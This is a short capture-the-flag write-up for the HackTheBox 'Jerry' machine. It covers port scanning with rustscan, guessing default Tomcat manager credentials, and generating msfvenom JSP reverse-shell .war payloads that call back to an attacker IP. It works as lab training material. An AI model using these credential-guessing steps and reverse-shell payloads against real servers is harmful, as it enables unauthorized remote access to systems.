### Summary

## Rustscan


Our scans show that just port 8080 is open, this is irregular but not unheard of. Typically 8080 is used by web services (tomcat in this case).

```
rustscan -a jerry.htb                                                                                 130 ‚®Ø

Nmap? More like slowmap.üê¢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.95:8080

[hacktricks pentesting tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat) is a great starting point for poking around it's interfaces. We can expect to find a login page at `/manager/html`. Following hacktricks suggestions, we run through default creds
- admin:admin 
- tomcat:tomcat
- admin:<NOTHING>
- admin:s3cr3t
- tomcat:s3cr3t - works!


# Tomcat reverse shell

There is a pattern with tomcat based boxes, they typically involve a reverse `.war` shell being uploaded and used to initiate a connection. Below is a command I used to generate a payload which I then uploaded and browsed to.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4445 -f war > shell.war
```
Here is the catch...it didn't work -- remember to try other ports if the first one you pick isn't working! Often times trying a commonly open port like 80 or 8080 (especially other open ports) will do the trick.

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=8080 -f war > shell.war
```

Just like that, we have root!
